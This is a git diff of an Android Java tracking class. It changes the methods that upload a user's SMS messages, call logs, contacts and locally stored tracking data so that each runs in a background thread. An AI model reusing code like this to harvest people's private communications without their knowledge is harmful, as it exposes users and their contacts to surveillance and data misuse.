@@ -77,39 +77,60 @@ public class TrackOperate {
     }
 
     //上传用户短信信息，mobile为当前登录用户的手机号
-    public static void upLoadSMS(String mobile) {
+    public static void upLoadSMS(final String mobile) {
         try {
-            upload(TrackData.mapList2String(TrackData.getSMSData(mobile)));
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    upload(TrackData.mapList2String(TrackData.getSMSData(mobile)));
+                }
+            }).start();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     //上传用户通话记录信息，mobile为当前登录用户的手机号
-    public static void upLoadCall(String mobile) {
+    public static void upLoadCall(final String mobile) {
         try {
-            upload(TrackData.mapList2String(TrackData.getCallData(mobile)));
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    upload(TrackData.mapList2String(TrackData.getCallData(mobile)));
+                }
+            }).start();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     //上传用户通话记录信息，mobile为当前登录用户的手机号
-    public static void upLoadContract(String mobile) {
+    public static void upLoadContract(final String mobile) {
         try {
-            upload(TrackData.mapList2String(TrackData.getContactData(mobile)));
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    upload(TrackData.mapList2String(TrackData.getContactData(mobile)));
+                }
+            }).start();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     //上传本地存储的数据
-    public static void upLoadLocalData(boolean clearData) {
+    public static void upLoadLocalData(final boolean clearData) {
         try {
-            upload(TrackLocalData.getTrackData());
-            if (clearData) {
-                TrackLocalData.clearTrackData();
-            }
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    upload(TrackLocalData.getTrackData());
+                    if (clearData) {
+                        TrackLocalData.clearTrackData();
+                    }
+                }
+            }).start();
+
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -117,8 +138,14 @@ public class TrackOperate {
 
     public static void upLoadLocalData() {
         try {
-            upload(TrackLocalData.getTrackData());
-            TrackLocalData.clearTrackData();
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    upload(TrackLocalData.getTrackData());
+                    TrackLocalData.clearTrackData();
+                }
+            }).start();
+
         } catch (Exception e) {
             e.printStackTrace();
         }
